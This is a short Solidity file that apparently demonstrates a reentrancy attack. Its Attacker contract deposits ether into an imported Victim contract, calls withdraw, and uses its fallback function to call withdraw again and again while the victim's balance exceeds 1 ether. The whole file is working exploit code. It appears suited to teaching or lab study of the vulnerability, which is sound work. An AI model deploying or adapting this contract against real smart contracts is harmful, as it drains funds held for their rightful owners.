// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Victim.sol";

contract Attacker {
    Victim public victim;
    constructor(Victim _victim){
        victim = _victim;
    }

    function attack() public {
        victim.withdraw();
    }

    function prepareDeposit() public payable {
        victim.deposit{value: msg.value}();
    }

    fallback() external payable {
        if (address(victim).balance > 1 ether) {
            victim.withdraw();
        }
    }

}
